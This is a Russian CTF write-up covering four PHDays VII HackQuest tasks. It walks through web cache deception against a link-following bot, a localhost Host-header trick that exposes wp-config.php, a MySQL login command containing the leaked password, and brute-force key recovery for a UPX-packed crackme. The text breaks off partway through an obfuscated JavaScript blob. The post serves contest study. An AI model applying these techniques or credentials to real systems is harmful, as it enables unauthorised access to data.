---
layout: post
title:  "PHDays VII HackQuest"
subtitle: ""
categories: [ctf]
---
IAICA:
Заходим на сайт, проходимся дирбастером, не  находим ничего интересного, смотрим на сорсы сайта
{% highlight ruby %}
<meta name="generator" content="Joomla! - Open Source Content Management">
{% endhighlight %}
из результатов дирбаста уверяемся что это никакой не джумла, идем в /blog/ там Wordpress 4.7.4 но зато с открытой регистрацией.
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/iaica-register.png)
Кроме этого, пройдя по ссылке:
{% highlight ruby %}
http://iaica.rosnadzorcom.ru/blog/?author=1
{% endhighlight %}
Видим пользователя admin, так как system.multicall был открыт в xmlrpc.php пытаемся проделать амплифайд брут, не приходим ни к чему, смотрим что еще можно сделать при помощи нашего юзера - оставлять комменты и писать посты. Пишем пост и добавляем ссылку на наш сниффер.
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/blog-bot-1.png)
Кроме превью от wordpress-a ничего не приходит, попробовав еще раз но уже добавивь картинку с ссылкой на наш сниффер видим:
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/blog-bot-2.png)
Однако где применить такой логин пароль - неизвестно, папок с basic http auth -ом нет на веб-сервере, на основном сайте успешно логинимся, однако здесь надо заметить что залогиниться под пользователем admin можно при помощи любого пароля. В итоге имеем 2 факта:
<br>1)логин-пароль фейковые
<br>2)Бот из блога ходит по нашим ссылкам.
<br>На этот таск был опубликован хинт, который нам и будет тут полезен
{% highlight ruby %}
Hint: IAICA — StyleSheets and JavaScripts are you best friends here!
Hint: IAICA — Look at the response headers
{% endhighlight %}

Во первых замечаем что имена js и css файлов это md5('имя-файла-без-расширения') например можно заметить файл a1b01e734b573fca08eb1a65e6df9a38.css(md5('style').css)
<br>Смотрим на разницу в хидерах при выдаче результата от php и при обращении к js/css ресурсам 

<br>php:
{% highlight ruby %}
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 12 May 2017 17:08:19 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 48632
{% endhighlight %}

<br>js/css:
{% highlight ruby %}
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 08 May 2017 18:53:30 GMT
Content-Type: text/css
Content-Length: 7046
Connection: close
Last-Modified: Thu, 20 Apr 2017 22:44:20 GMT
ETag: "58f939c4-1b86"
Expires: Mon, 08 May 2017 18:55:15 GMT
Cache-Control: max-age=120
Cache-Control: public
Accept-Ranges: bytes
{% endhighlight %}

Основное различие здесь в хидерах кеширования, js/css -  кешируются, а остальные - нет.
Настало время просмотреть на роутинг бэкенда/веб-сервера, сразу же замечаем, что адреса типа: 

{% highlight ruby %}
/login/md5().css
/registration/md5().css
/md5().css
{% endhighlight %}

Не перенаправляются на 404, а просто выводят страницу к которой мы обращались, кстати тоже самое работает также и с .js

Кроме этого при обращении к одному из вышеописаных роутов в response header-ах есть:
{% highlight ruby %}
X-Fastcgi-Cache: MISS
{% endhighlight %}

Это означает что fastcgi_cache сконфигурирован неправильно, судя по всему он пытается выдать закешированный результат если url заканчивается на md5().js/md5().css

А также
{% highlight ruby %}
Date: Mon, 08 May 2017 18:56:10 GMT
Expires: Mon, 08 May 2017 18:59:02 GMT
Cache-Control: max-age=180
{% endhighlight %}
Соответственно результат вывода будет кешироватся браузером на протяжении 3х минут - то есть столько же она пробудет в fastcgi_cache.
Так как, в основном, id закешированного файла в fast_cgi должен создаваться на основе url-a:
{% highlight ruby %}
1.генерируем случайный md5
2.Идем на /blog/ и отправляем бота на /md5().css
3.Проверяем чтобы статус поста был DECLINED(значит, что бот прошел по ссылке)
4.Сразу же идем тоже по тому же адресу /md5().css
{% endhighlight %}
Внизу сайта замечаем:
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/iaica-admin.png)
Появился Admin Panel, который ведет на /a6805bde-30c8-4536-9137-39b32eb28218/ и там нам снова отказывают в доступе
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/iaica-panel.png)
Проделываем шаги описанные выше но уже отправляя бота на /a6805bde-30c8-4536-9137-39b32eb28218/md5().css
В конце концов видем Admin Panel
{% highlight ruby %}
IAICA secret phrase is "Hell yeah bro! You did it! Man, you blow up this fake anti-corruption organization."
{% endhighlight %}


## PWND!

## flag:<font color="red">md5("Hell yeah bro! You did it! Man, you blow up this fake anti-corruption organization.")</font>
<br><br><br>

BETA:
Заходим на сайт, видим что там Wordpress 4.7.4, производим обычный скан по вордпрессу, кроме плагина Akismet ничего не находим. Ищем пользователей Wordpress - находим по ссылке:
{% highlight ruby %}
http://beta.rosnadzorcom.ru/?author=1
{% endhighlight %}
Пользователь Rosnadzorcom, изучаем rest-api и xmlrpc в Wordpress, видим что в xmlrpc опять открыт **system.multicall**, а в /?route_rest видим хидер
{% highlight ruby %}
Access-Control-Allow-Headers:Authorization
{% endhighlight %}
Пробуем брутить и там и там, нигде не добиваемся успехов. Порыскав еще немного идем в wp-admin и пытаемся сделать сброс пароля, оказывается на сервере стоит конфигурация вывода ошибок (скорее всего WP_DEBUG,WP_DEBUG_DISPLAY включены), кстати эту же ошибку можно увидеть, если попытаться оставить комментарий 
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/beta-error.png)
Судя по ошибке, wordpress умирает от того что в поле Form, отправки мейла стоит значение 'wordpress@__'. Бежим на github вордпресса смотреть исходники функции wp_mail()
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/beta-wp-mail.png)
Судя по коду $_SERVER["SERVER_NAME"]=  '__' . Во время просмотра сайта, в хидерах или же в выводе кода 404 можно было заметить что на сервере работает nginx. 
<br>Прочитав документацию узнаем, что в конфигурации nginx символ  '_' имеет специальное значение - им обозначается хостнейм по умолчанию (default), то есть, это хостнейм к которому будет обращаться nginx если не будет других совпадений. 
<br>Тем самым предполагаем, что есть другие хостнеймы к которым можно обратить nginx. Первое что приходит в голову, что стоит проверить - localhost. Так как нам неизвестен IP сервера, крафтим запрос следующим образом
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/beta-burp.png)
И видим (в этом случае радостный) 403 forbidden.
<br>Вспоминаем что при выводе ошибок мы также получаем и Full Path Disclosure. идем на http://localhost/wordpress/wp-config.php
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/beta-wp-config.png)
Вроде бы надо приконектиться к mysql на сервере white2fan.rosnadzorcom.ru однако этот домен резолвиться в 127.0.0.1, далее промелькает мысль обратиться к этому хостнейму и найти там phpmyadmin.
<br>После неудачных попыток догадываемся узнать побольше о самом домейне в итоге смотрим AAAA record и видим что ipv6 указывает далеко не на локалхост
{% highlight ruby %}
2a03:b0c0:2:d0::21c7:2001
{% endhighlight %}
Тут есть одна загвоздка, возможно у вашего провайдера нет роутов для ipv6(например в моем случае было именно так), но под рукой оказался сервер в Германии, так что дальнейшие действия проделываем оттуда.
<br>Конектимся к mysql
{% highlight ruby %}
mysql -h 2a03:b0c0:2:d0::21c7:2001 -u wordpress -pOMGOMGWTFWTF
{% endhighlight %}
Видим таблицу flag 
{% highlight ruby %}
+---------------------+
| Tables_in_wordpress |
+---------------------+
| flag                |
+---------------------+
{% endhighlight %}
Но в этой таблице нет строк, но здесь все несложно просто смотрим columns
{% highlight ruby %}
+----------------------------------+------------+------+-----+---------+-------+
| Field                            | Type       | Null | Key | Default | Extra |
+----------------------------------+------------+------+-----+---------+-------+
| a33d6a48821d9c33f00219710eb9aeef | tinyint(1) | NO   |     | 1       |       |
+----------------------------------+------------+------+-----+---------+-------+
{% endhighlight %}

## PWND!

## flag:<font color="red">a33d6a48821d9c33f00219710eb9aeef</font>


<br>FortBoyard:Скачиваем файл, проверяем на присутствие пакеров - видим UPX, если сейчас распаковать upx то останется только функция которая врубает дефолтный браузер и отправляет нас на смешной видосик "форд боярд", так что лучше давайте сами попытаемся дернуть ехе из него.

<br>Загружем файл в любимый дизассемблер(IDA). Если вы часто распаковываете бинари, то знаете что нам надо найти код вида:
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/ford-upx.png)
То есть выход из лупа по распаковке(ясно, что в UPX можно просто и наизусть помнить где это, но я пишу в обших чертах). Ставим там брейкпоинт и идем за call-ом. Дальше трассируем программу и замечаем что она использует GetProcAddress(), LoadLibrary() чтобы получить некоторые функции winapi, в том числе и WriteFile(). Трассируем до выполнения функции WriteFile и видим, что программа записывает в temp папку некий w.exe, как только  она записывает, паузим программу и идем копировать w.exe в более удобное для нас место.

 <br>Вновь оказывается, что w.exe упакован UPX-ом, но на этот раз нам уже терять нечего, можно спокойно его распаковывать.
<br>Наконец у нас под рукой именно тот бинарь, который и надо анализировать. Загрузив в IDA видим
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/ford-dialog.png)
Работает обычная диалоговая функция, которая берет значение из textbox-а serial и отдает функции sub4015D0.Смотрим что в ней. После инициализационной логики идет основная часть проверки серийного ключа
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/ford-check.png)
Во первых в ebx и в esi загружаются адреса массивов(далее узнаем каких) и вызывается функция sub_401000, которой передается наш серийный номер, а результат записывается в [ebp+var_8], после чего проверяется равенство байтам из массива, который загружался в ebx, если все правильно, делается еще один цикл, с новыми массивами в ebx и esi, всего таких будет максимум 32. Пойдемте смотреть sub_401000.

<br>Так как код там большой, чтобы показать в скриншоте, покажу лишь основную часть функции и то уже в рипнутом виде на язык C(пришлось использовать Hex-rays и потом еще его поправлять долго)
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/ford-cipher.png)
Понимаем, что тут самописный block cipher, с 129 раундами и двумя Sbox-ами(это byte_4031A0[] и byte_4032A0[]). причем первые 128 раундов проделываются при помощи byte_4031A0(далее будем называть его Sbox1), и лишь последний с byte_4032A0(Sbox2  соответственно), уже понимаем, что загруженный в esi массив - плейнтекст, в ebx - шифротекст, а наш серийник является ключем шифрования. В первых 128 раундах, после подстановки Sbox1, вывод также xor-ится с ключем(плюс еще делается xor с (i%8)+1, где i - номер раунда), а также делается некий шифт. во время которого для каждого байта делается следующее - оставляются нижние 4 бита, а верхние 4 бита заменяются верхними следующего бита, если речь идет о последнем байте result+7, то верхние для него берутся и первого байта result+0.
{% highlight ruby %}
v9 = *(char *)(result + 1);
v10 = *(char *)result;
*(char *)result = v9 ^ (v9 ^ *(char *)result) & 0xF;
v11 = v9 ^ *(char *)(result + 2);
v12 = *(char *)(result + 2);
*(char *)(result + 1) = v12 ^ v11 & 0xF;
v13 = v12 ^ *(char *)(result + 3);
v14 = *(char *)(result + 3);
*(char *)(result + 2) = v14 ^ v13 & 0xF;
v15 = v14 ^ *(char *)(result + 4);
v16 = *(char *)(result + 4);
*(char *)(result + 3) = v16 ^ v15 & 0xF;
v17 = v16 ^ *(char *)(result + 5);
v18 = *(char *)(result + 5);
*(char *)(result + 4) = v18 ^ v17 & 0xF;
v19 = v18 ^ *(char *)(result + 6);
v20 = *(char *)(result + 6);
*(char *)(result + 5) = v20 ^ v19 & 0xF;
*(char *)(result + 6) = *(char *)(result + 7) ^ (v20 ^ *(char *)(result + 7)) & 0xF;
*(char *)(result + 7) = v10 & 0xF0 | *(char *)(result + 7) & 0xF;
{% endhighlight %}
Далее идет, скорее всего, самая трудная часть, так как надо либо при помощи методов линейного анализа шифра, либо через методы проб-и-тыка найти соотношение 
{% highlight ruby %}
Sbox1[x]&2 == x&2
{% endhighlight %}
Или же, иными словами, что 2й бит всех байтов остается неизменным при подстновке Sbox1, вспомнив как работает шифт в этом шифре, получаем, что 2й бит неизменен вплоть до самого последнего раунда(не включительно, так как для Sbox2 соотношение не выполняется), а как же xor c (i%8)+1, где i - номер раунда
{% highlight ruby %}
*(char *)result ^= *(char *)(v5 % 8 + a3) ^ byte_4033E0[v5 % 8];
v8 = v5 + 1;
v21 = v5 + 1;
*(char *)(result + 1) ^= *(char *)((v5 + 1) % 8 + a3) ^ byte_4033E0[(v5 + 1) % 8];
*(char *)(result + 2) ^= *(char *)((v5 + 2) % 8 + a3) ^ byte_4033E0[(v5 + 2) % 8];
*(char *)(result + 3) ^= *(char *)((v5 + 3) % 8 + a3) ^ byte_4033E0[(v5 + 3) % 8];
*(char *)(result + 4) ^= *(char *)((v5 + 4) % 8 + a3) ^ byte_4033E0[(v5 + 4) % 8];
*(char *)(result + 5) ^= *(char *)((v5 + 5) % 8 + a3) ^ byte_4033E0[(v5 + 5) % 8];
*(char *)(result + 6) ^= *(char *)((v5 + 6) % 8 + a3) ^ byte_4033E0[(v5 + 6) % 8];
*(char *)(result + 7) ^= *(char *)((v5 + 7) % 8 + a3) ^ byte_4033E0[(v5 + 7) % 8];
{% endhighlight %}
Тут дело в том, что номер раунда берется по модулю 8, а значит xor у нас будет с этим битом, только в 1 из 4 случаев, получаем 128/4=32, 32 - четное, а xor с одним и тем же четное количество раз ничего не изменяет.
Получается, что у нас есть возможность сузить значения для брута для кажого из байтов по отдельности, надо лишь перевернуть алгоритм последнего раунда и проверять, чтобы выполнялось найденное нами соотношение.
Не забываем проделать это со всеми 32 парами plaintext-ciphertext
{% highlight ruby %}
for i in range(8):
    print "bruting key["+str(i)+"]"
    for z in range(32):
        lol=[]
        for c in range(256):
            if (byte_4032A0.index(chr(ord(unk_4030A0[(z*8)+i])^c^((i%8)+1)) & 2) == (ord(off_403020[(z*8)+i])&2):
                if z == 0:
                lol.append(c)
                a[i].append(c)
            else:
                lol.append(c)
        key[i] = list(set(key[i]).intersection(lol))
{% endhighlight %}
И видим, что пар plaintext-ciphertext хватило, чтобы однозначно вернуть все байты ключа
{% highlight ruby %}
bruting key[0]
[(]
bruting key[1]
[&]
bruting key[2]
[%]
bruting key[3]
[^]
bruting key[4]
[c]
bruting key[5]
[d]
bruting key[6]
[e]
bruting key[7]
[f]
{% endhighlight %}
Запускаем программу и вводим "(&%^cdef" в серийник, в ответ получаем MessageBox c флагом
<br><br>
## PWND!

## flag:<font color="red">b64f49553d5c441652e95697a2c5949e</font>


<br><br>Moderation: Заходим на сайт, ничего не видим, сканируем директории и находим /moderator/ и /admin/ в них особо ничего больше не находим, в /admin/ вообще ничего не можем сделать - глухой 403 forbidden, а вот в /moderator/, если вы используете хоть какой web-proxy к примеру burp suite, то заметите, что в респонсе на редирект все же возвращается та страница, которую видит залогиненый модератор, такая ошибка бывает, когда программист просто прописывает редирект хидеры причем в том же самом серверном скрипте. в принципе самое интересное для нас это минифицированный и обфусцированный js файл, изначально он выглядит примерно так 
{% highlight ruby %}
<script type="text/javascript">
var _0xe5eb=['\x77\x6f\x37\x43\x73\x47\x38\x3d','\x43\x52\x68\x51\x64\x55\x52\x4d\x54\x38\x4f\x69\x77\x36\x37\x44\x6e\x38\x4f\x67\x77\x34\x55\x3d','\x65\x6b\x34\x69\x77\x71\x6e\x44\x75\x4d\x4f\x70\x77\x35\x66\x44\x71\x6e\x4d\x68\x4e\x77\x3d\x3d','\x63\x52\x64\x4d\x48\x51\x3d\x3d','\x58\x4d\x4f\x56\x65\x73\x4b\x66','\x46\x4d\x4f\x68\x41\x38\x4f\x58\x77\x6f\x38\x3d','\x49\x38\x4f\x48\x77\x35\x68\x42\x56\x41\x3d\x3d','\x77\x6f\x50\x44\x72\x73\x4f\x46\x77\x35\x68\x47\x61\x45\x33\x44\x6c\x44\x6e\x44\x68\x63\x4f\x52\x4d\x38\x4b\x47\x77\x6f\x62\x44\x6f\x73\x4f\x78\x65\x52\x4c\x44\x69\x73\x4f\x4e\x77\x37\x37\x44\x6c\x79\x6e\x44\x6b\x4d\x4f\x45\x77\x70\x7a\x43\x73\x44\x4d\x3d','\x4e\x43\x6a\x44\x76\x30\x46\x59\x55\x63\x4b\x56\x77\x36\x54\x43\x6d\x46\x44\x44\x72\x69\x54\x44\x6c\x55\x73\x6e\x48\x57\x72\x43\x71\x4d\x4f\x39\x77\x6f\x63\x59\x77\x70\x44\x44\x69\x38\x4f\x6e\x77\x34\x33\x44\x67\x51\x3d\x3d','\x43\x4d\x4f\x38\x77\x71\x33\x43\x76\x73\x4b\x2f\x77\x34\x64\x76\x77\x70\x49\x70\x64\x38\x4b\x77\x77\x71\x72\x44\x6b\x4d\x4f\x38\x77\x71\x4c\x43\x69\x6a\x6c\x32\x77\x71\x37\x43\x74\x38\x4f\x6f\x77\x35\x55\x3d','\x77\x37\x4d\x66\x47\x32\x6a\x44\x6d\x41\x6a\x43\x6f\x63\x4f\x59\x42\x73\x4b\x7a\x77\x35\x4e\x63\x77\x37\x6a\x43\x73\x38\x4f\x58\x4f\x63\x4b\x34\x47\x4d\x4b\x34\x77\x35\x6a\x44\x69\x41\x3d\x3d','\x65\x77\x78\x63\x46\x4d\x4f\x37\x56\x6c\x4c\x43\x73\x38\x4b\x37\x54\x78\x54\x44\x74\x73\x4f\x6f\x4f\x63\x4f\x36\x42\x4d\x4f\x6e\x59\x63\x4f\x66\x4b\x73\x4b\x4e\x59\x77\x3d\x3d','\x77\x70\x7a\x43\x72\x4d\x4f\x6d\x46\x57\x33\x44\x71\x77\x3d\x3d','\x41\x63\x4f\x6b\x62\x31\x51\x3d','\x77\x37\x6a\x44\x70\x56\x58\x44\x73\x73\x4b\x41\x77\x35\x66\x43\x70\x38\x4b\x57\x77\x34\x51\x77\x65\x67\x52\x72\x77\x6f\x56\x32\x4e\x32\x37\x44\x6a\x4d\x4b\x6c\x77\x34\x4a\x62','\x42\x32\x44\x44\x6d\x44\x58\x44\x69\x58\x74\x52\x77\x72\x38\x64\x4e\x78\x6f\x76','\x77\x36\x74\x47\x77\x71\x6f\x79\x77\x34\x46\x30\x77\x70\x72\x44\x75\x69\x50\x44\x76\x63\x4f\x68\x51\x55\x44\x43\x6d\x63\x4f\x33\x77\x6f\x70\x6e\x65\x63\x4f\x32\x5a\x56\x68\x4a\x77\x34\x7a\x43\x71\x77\x45\x45\x54\x63\x4b\x78\x77\x37\x6e\x43\x6f\x63\x4b\x4f\x4b\x63\x4f\x75','\x46\x63\x4b\x67\x77\x37\x45\x4d\x77\x6f\x73\x77\x4b\x77\x74\x4b\x77\x71\x72\x44\x67\x44\x68\x54\x77\x36\x49\x7a\x57\x51\x3d\x3d','\x47\x4d\x4f\x58\x48\x38\x4f\x30','\x50\x38\x4f\x61\x43\x63\x4b\x78\x63\x30\x6b\x6c\x77\x71\x77\x4e\x77\x6f\x48\x44\x71\x73\x4f\x75\x41\x63\x4b\x69\x41\x63\x4f\x56\x61\x54\x7a\x44\x72\x79\x73\x38\x62\x4d\x4b\x63\x4f\x4d\x4f\x31\x77\x35\x74\x67\x48\x53\x4a\x6a\x48\x6c\x50\x43\x6a\x68\x4d\x3d','\x77\x6f\x66\x44\x6f\x73\x4b\x67','\x77\x35\x6f\x47\x48\x77\x3d\x3d','\x66\x63\x4b\x43\x50\x51\x3d\x3d','\x55\x63\x4b\x43\x46\x77\x3d\x3d','\x49\x73\x4b\x6e\x77\x34\x77\x3d','\x77\x70\x6f\x44\x77\x70\x34\x48\x58\x73\x4b\x58\x4e\x38\x4f\x74\x4c\x38\x4b\x33\x77\x36\x51\x3d','\x77\x34\x54\x43\x6e\x73\x4f\x52\x77\x71\x50\x44\x67\x77\x3d\x3d','\x77\x34\x50\x44\x69\x54\x45\x3d','\x77\x6f\x44\x44\x6a\x63\x4f\x33','\x62\x6d\x66\x43\x67\x67\x3d\x3d','\x4d\x30\x52\x44','\x4a\x77\x51\x59\x47\x4d\x4f\x7a\x42\x55\x6a\x43\x74\x73\x4f\x6e\x52\x6c\x55\x3d','\x61\x45\x34\x2b\x77\x71\x58\x44\x6f\x67\x3d\x3d','\x66\x6e\x44\x43\x76\x77\x3d\x3d','\x43\x73\x4f\x58\x77\x70\x77\x3d','\x77\x72\x59\x31\x77\x72\x59\x3d','\x77\x70\x42\x35\x77\x71\x67\x3d','\x49\x38\x4f\x67\x42\x51\x3d\x3d','\x4d\x4d\x4f\x61\x77\x36\x45\x3d','\x77\x6f\x54\x44\x73\x32\x4d\x3d','\x77\x72\x72\x43\x72\x55\x41\x3d','\x4c\x6a\x6e\x44\x6d\x67\x3d\x3d','\x4a\x44\x58\x44\x6d\x67\x3d\x3d','\x49\x79\x7a\x44\x6e\x58\x34\x7a\x77\x37\x6a\x44\x6d\x38\x4f\x74\x46\x4d\x4f\x38\x77\x72\x72\x43\x6f\x73\x4b\x4e\x66\x56\x59\x3d','\x77\x72\x58\x43\x6c\x6e\x4d\x3d','\x4f\x6e\x68\x39','\x4e\x73\x4f\x56\x77\x6f\x51\x3d','\x4e\x38\x4b\x41\x77\x6f\x45\x3d','\x77\x71\x76\x44\x6e\x63\x4b\x4e','\x77\x35\x4c\x44\x68\x38\x4b\x38','\x64\x63\x4f\x50\x41\x48\x62\x43\x76\x33\x45\x3d','\x4b\x38\x4f\x45\x77\x71\x4d\x3d','\x4c\x38\x4f\x36\x41\x77\x3d\x3d','\x47\x58\x4a\x54\x41\x4d\x4f\x48\x77\x35\x74\x45\x77\x72\x34\x3d','\x64\x73\x4b\x50\x4d\x46\x72\x43\x75\x38\x4b\x6d\x52\x6c\x35\x4e\x77\x37\x6c\x6b','\x41\x73\x4b\x67\x77\x36\x63\x72\x77\x6f\x6b\x6d\x4f\x78\x77\x3d','\x77\x35\x49\x43\x45\x67\x3d\x3d','\x77\x36\x4c\x44\x73\x52\x6b\x3d','\x42\x38\x4b\x31\x77\x37\x55\x79\x77\x70\x63\x3d','\x77\x37\x50\x43\x71\x4d\x4b\x33','\x77\x35\x49\x43\x4c\x41\x3d\x3d','\x45\x54\x2f\x44\x6f\x6b\x42\x50\x48\x38\x4b\x58\x77\x72\x58\x43\x6d\x31\x62\x43\x6f\x6d\x76\x43\x67\x55\x73\x75\x55\x7a\x76\x44\x72\x73\x4b\x6f','\x77\x34\x72\x43\x76\x38\x4f\x58\x46\x38\x4f\x34\x48\x73\x4b\x4a\x77\x70\x78\x47\x77\x6f\x6c\x50\x77\x71\x72\x43\x69\x4d\x4b\x74\x61\x38\x4f\x2b\x77\x35\x66\x44\x69\x63\x4b\x52\x46\x63\x4f\x34\x4f\x41\x68\x70\x66\x38\x4f\x33\x64\x47\x64\x51\x4f\x73\x4b\x51\x4b\x67\x3d\x3d','\x4e\x6b\x52\x66','\x77\x35\x72\x43\x67\x6b\x37\x43\x6f\x44\x48\x44\x72\x4d\x4b\x41','\x77\x34\x54\x43\x68\x51\x66\x44\x73\x67\x68\x73\x77\x70\x7a\x43\x6c\x57\x55\x55\x50\x63\x4f\x78\x77\x72\x74\x4a\x54\x73\x4f\x5a\x47\x77\x3d\x3d','\x4e\x33\x2f\x44\x6d\x69\x6a\x44\x6d\x41\x3d\x3d','\x77\x35\x54\x43\x75\x73\x4b\x61\x45\x63\x4f\x6e\x42\x4d\x4b\x54\x77\x6f\x64\x61','\x50\x38\x4b\x34\x77\x71\x39\x2f','\x77\x37\x4c\x44\x72\x38\x4b\x72\x50\x7a\x34\x3d','\x45\x63\x4f\x6b\x63\x51\x59\x4e','\x5a\x42\x6c\x61\x43\x67\x3d\x3d','\x4b\x63\x4f\x68\x41\x4d\x4f\x4b\x77\x35\x63\x3d','\x77\x72\x74\x4b\x77\x36\x77\x69\x77\x70\x70\x72\x77\x34\x37\x44\x73\x6e\x37\x44\x72\x73\x4b\x38\x45\x67\x67\x3d','\x4e\x73\x4f\x64\x77\x72\x33\x44\x6f\x38\x4b\x6f','\x55\x6d\x58\x43\x6e\x4d\x4b\x30\x49\x63\x4b\x78\x77\x70\x6b\x3d','\x77\x36\x58\x44\x6b\x51\x6e\x44\x6c\x53\x67\x3d','\x63\x44\x2f\x43\x67\x6e\x46\x6f\x77\x36\x6a\x43\x69\x51\x3d\x3d','\x61\x57\x66\x43\x70\x44\x41\x71\x45\x67\x6b\x3d','\x77\x36\x4c\x44\x75\x4d\x4b\x6f\x4b\x54\x77\x3d','\x4e\x63\x4b\x35\x77\x71\x64\x6a\x64\x38\x4b\x7a\x77\x37\x6f\x3d','\x56\x48\x4c\x43\x6b\x63\x4b\x69\x50\x73\x4b\x70\x77\x70\x58\x44\x68\x54\x4d\x3d','\x46\x38\x4f\x35\x62\x52\x6f\x51\x4b\x73\x4f\x64','\x59\x32\x62\x43\x72\x43\x77\x3d','\x77\x34\x37\x43\x6a\x46\x4c\x43\x76\x51\x3d\x3d','\x77\x70\x6a\x43\x71\x4d\x4f\x37\x47\x67\x3d\x3d','\x77\x70\x58\x43\x73\x47\x6e\x44\x6b\x67\x3d\x3d','\x64\x63\x4f\x6d\x77\x37\x6b\x68\x4e\x73\x4b\x31\x77\x36\x2f\x43\x73\x41\x3d\x3d','\x46\x63\x4f\x4f\x77\x72\x59\x2b\x77\x34\x37\x44\x72\x67\x3d\x3d','\x77\x34\x76\x43\x69\x46\x44\x43\x76\x7a\x2f\x44\x6f\x38\x4b\x41','\x77\x71\x62\x44\x76\x63\x4f\x43\x77\x34\x68\x4d\x4a\x51\x3d\x3d','\x66\x38\x4f\x47\x41\x58\x37\x43\x75\x51\x3d\x3d','\x4e\x38\x4f\x41\x48\x6e\x59\x3d','\x48\x63\x4f\x55\x77\x35\x74\x46\x47\x43\x70\x42\x49\x52\x37\x43\x70\x67\x3d\x3d','\x63\x4d\x4f\x45\x43\x6e\x54\x43\x73\x31\x59\x30','\x52\x38\x4b\x62\x77\x35\x38\x3d','\x77\x37\x4d\x66\x47\x32\x6a\x44\x6d\x41\x6a\x43\x6f\x51\x3d\x3d','\x45\x78\x74\x57\x56\x56\x31\x64'];(function(_0x4b5510,_0x4bbc29){var _0x84dca=function(_0x22756c){while(--_0x22756c){_0x4b5510['\x70\x75\x73\x68'](_0x4b5510['\x73\x68\x69\x66\x74']());}};var _0x4bc567=function(){var _0x375e6a={'\x64\x61\x74\x61':{'\x6b\x65\x79':'\x63\x6f\x6f\x6b\x69\x65','\x76\x61\x6c\x75\x65':'\x74\x69\x6d\x65\x6f\x75\x74'},'\x73\x65\x74\x43\x6f\x6f\x6b\x69\x65':function(_0xff4850,_0x1068ad,_0x21c1ab,_0x50b3fc){_0x50b3fc=_0x50b3fc||{};var _0x549ed8=_0x1068ad+'\x3d'+_0x21c1ab;var _0x393bcc=0x0;for(var _0x393bcc=0x0,_0x47044a=_0xff4850['\x6c\x65\x6e\x67\x74\x68'];_0x393bcc<_0x47044a;_0x393bcc++){var _0x4b0b4e=_0xff4850[_0x393bcc];_0x549ed8+='\x3b\x20'+_0x4b0b4e;var _0x35bc6d=_0xff4850[_0x4b0b4e];_0xff4850['\x70\x75\x73\x68'](_0x35bc6d);_0x47044a=_0xff4850['\x6c\x65\x6e\x67\x74\x68'];if(_0x35bc6d!==!![]){_0x549ed8+='\x3d'+_0x35bc6d;}}_0x50b3fc['\x63\x6f\x6f\x6b\x69\x65']=_0x549ed8;},'\x72\x65\x6d\x6f\x76\x65\x43\x6f\x6f\x6b\x69\x65':function(){return'\x64\x65\x76';},'\x67\x65\x74\x43\x6f\x6f\x6b\x69\x65':function(_0x3b3144,_0x55d70b){_0x3b3144=_0x3b3144||function(_0x55bfd7){return _0x55bfd7;};var _0x344bdf=_0x3b3144(new RegExp('\x28\x3f\x3a\x5e\x7c\x3b\x20\x29'+_0x55d70b['\x72\x65\x70\x6c\x61\x63\x65'](/([.$?*|{}()[]\/+^])/g,'\x24\x31')+'\x3d\x28\x5b\x5e\x3b\x5d\x2a\x29'));var _0x12e65f=function(_0x2682ec,_0x4f28bb){_0x2682ec(++_0x4f28bb);};_0x12e65f(_0x84dca,_0x4bbc29);return _0x344bdf?decodeURIComponent(_0x344bdf[0x1]):undefined;}};var _0x7b2fc8=function(){var _0x35fa82=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return _0x35fa82['\x74\x65\x73\x74'](_0x375e6a['\x72\x65\x6d\x6f\x76\x65\x43\x6f\x6f\x6b\x69\x65']['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};_0x375e6a['\x75\x70\x64\x61\x74\x65\x43\x6f\x6f\x6b\x69\x65']=_0x7b2fc8;var _0x5b212f='';var _0x38afe4=_0x375e6a['\x75\x70\x64\x61\x74\x65\x43\x6f\x6f\x6b\x69\x65']();if(!_0x38afe4){_0x375e6a['\x73\x65\x74\x43\x6f\x6f\x6b\x69\x65'](['\x2a'],'\x63\x6f\x75\x6e\x74\x65\x72',0x1);}else if(_0x38afe4){_0x5b212f=_0x375e6a['\x67\x65\x74\x43\x6f\x6f\x6b\x69\x65'](null,'\x63\x6f\x75\x6e\x74\x65\x72');}else{_0x375e6a['\x72\x65\x6d\x6f\x76\x65\x43\x6f\x6f\x6b\x69\x65']();}};_0x4bc567();}(_0xe5eb,0x160));var _0xbe5e=function(_0x4b5510,_0x4bbc29){_0x4b5510=_0x4b5510-0x0;var _0x84dca=_0xe5eb[_0x4b5510];if(_0xbe5e['\x69\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']===undefined){(function(){var _0x2007c7=Function('\x72\x65\x74\x75\x72\x6e\x20\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x28\x29\x20'+'\x7b\x7d\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x28\x22\x72\x65\x74\x75\x72\x6e\x20\x74\x68\x69\x73\x22\x29\x28\x29'+'\x29\x3b');var _0x4bc567=_0x2007c7();var 